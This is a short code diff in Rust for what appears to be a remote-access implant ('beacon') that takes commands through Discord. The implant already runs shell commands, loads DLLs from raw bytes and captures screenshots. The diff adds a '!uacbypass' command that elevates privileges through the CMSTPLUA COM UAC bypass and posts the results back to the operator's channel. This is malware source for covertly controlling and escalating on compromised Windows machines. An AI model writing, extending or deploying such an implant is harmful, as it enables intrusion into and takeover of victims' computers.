@@ -14,7 +14,7 @@ use reqwest::StatusCode;
 #[cfg(windows)]
 use crate::commands::capture_screenshot;
 use crate::commands::{
-    execute_shell_command, get_help_message, load_dll_from_bytes, Command, CommandResult,
+    execute_shell_command, execute_uac_bypass, get_help_message, load_dll_from_bytes, Command, CommandResult,
 };
 use crate::config::Config;
 use crate::error::{BeaconError, Result};
@@ -399,6 +399,12 @@ impl DiscordClient {
             Command::LoadDll(dll_name) => {
                 // Handle !loaddll command
                 let result = self.handle_loaddll(&msg.attachments, &dll_name);
+                self.send_command_result(channel_id, result)?;
+                Ok(true)
+            }
+            Command::UacBypass(cmd) => {
+                // Handle !uacbypass command - elevate privileges via CMSTPLUA COM bypass
+                let result = execute_uac_bypass(&cmd);
                 self.send_command_result(channel_id, result)?;
                 Ok(true)
             }
